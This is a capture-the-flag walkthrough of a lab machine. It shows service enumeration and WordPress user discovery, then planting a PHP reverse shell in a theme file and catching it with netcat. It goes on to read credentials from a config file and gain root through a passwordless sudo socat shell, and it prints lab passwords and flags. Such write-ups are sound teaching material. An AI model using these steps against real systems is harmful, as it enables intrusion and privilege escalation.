#IP 
10.10.100.106

## Enumeration
####Nmap
Found three service running on the system
1. HTTP
2. SSH
3. FTP
```console
❯  nmap -sC -sV 10.10.100.106 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-07 18:52 IST
Nmap scan report for 10.10.100.106
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.39.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.45 seconds

```
###Website
####Gobuster
Found two interesting directories with gobuster
1. wordpress
2. hackathon
```console
❯ gobuster dir --url http://10.10.100.106 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.100.106
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/07 19:43:44 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.100.106/wordpress/]
/hackathons           (Status: 200) [Size: 197]                                      
Progress: 9191 / 220561 (4.17%)                                                     ^C
[!] Keyboard interrupt detected, terminating.
                                                                                     
===============================================================
2022/10/07 19:46:02 Finished
===============================================================

```
In the hackathon web directory found 
```console
❯ curl http://10.10.100.106/hackathons
<html>
<body>
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>






<!-- Dvc W@iyur@123 -->  
<!-- KeepGoing -->
</body>
</html>


```
On Cracking `Dvc W@iyur@123` with [Vigenère Cipher Decoder](https://www.boxentriq.com/code-breaking/vigenere-cipher)  and passphrase as `KeepGoing` found it to be `Try H@ckme@123`
####Wordpress
Started cracking the user for wordpress
```console
❯ cat wordpress.log
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.100.106/wordpress/ [10.10.100.106]
[+] Started: Fri Oct  7 19:08:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.100.106/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.100.106/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.100.106/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.100.106/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.100.106/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.100.106/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.100.106/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.10.100.106/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://10.10.100.106/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.100.106/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |=====================================================|

[i] User(s) Identified:

[+] elyana              <---------------------------------------------------------------------------------Found the username
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.100.106/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Oct  7 19:08:19 2022
[+] Requests Done: 13
[+] Cached Requests: 46
[+] Data Sent: 3.61 KB
[+] Data Received: 11.523 KB
[+] Memory used: 196.438 MB
[+] Elapsed time: 00:00:03

```
- Logged in as user elyana and password as `H@ckme@ 123`.
- After Login changed theme for 404.php in Theme Editor to a  [php reverse shell](https://github.com/divu050704/tryhackme-notes/blob/main/allinonemj/php-reverse-shell.php) .
- Accessed the reverse shell by url http://10.10.100.106/wordpress/wp-content/themes/twentytwenty/404.php after starting netcat reverse shell
##Reverse Shell
1. Caught the reverse shell
```console
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.39.205] from (UNKNOWN) [10.10.100.106] 60218
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:28:42 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1004): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$
```
2. But Can't read the `user.txt` due user rights.
3. On reading `hint.txt`.
```console
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```
4. Searched for files ownerd by `elyana`
```console
bash-4.4$ find / -user elyana -type f 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt

```
5. Found Credentials in `/etc/mysql/conf.d/private.txt`
```console
bash-4.4$ cat /etc/mysql/conf.d/private.txt
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```
6. Logged in with ssh
###SSH
1. On login with ssh found the user flag but it was encoded in base64 do decoded it
```console
❯ ssh elyana@10.10.100.106
elyana@10.10.100.106's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  7 14:35:16 UTC 2022

  System load:  0.02              Processes:           130
  Usage of /:   53.4% of 6.41GB   Users logged in:     0
  Memory usage: 75%               IP address for eth0: 10.10.100.106
  Swap usage:   0%


16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct  7 14:04:12 2022 from 10.17.39.205
-bash-4.4$ cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
-bash-4.4$ echo "VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259" | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}   <------------------user flag
-bash-4.4$ 
```
2. On running `sudo -l` found that the `socat` had permission to run without password.
3. Found the sudo shell command for `socat` on [gtfobins](https://gtfobins.github.io/gtfobins/socat/#shell).
**There will be no prompt**
```console
-bash-4.4$ sudo socat stdin exec:/bin/sh
whoami
root
cat /root/root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
echo "VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9" | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8} <------root flag

```
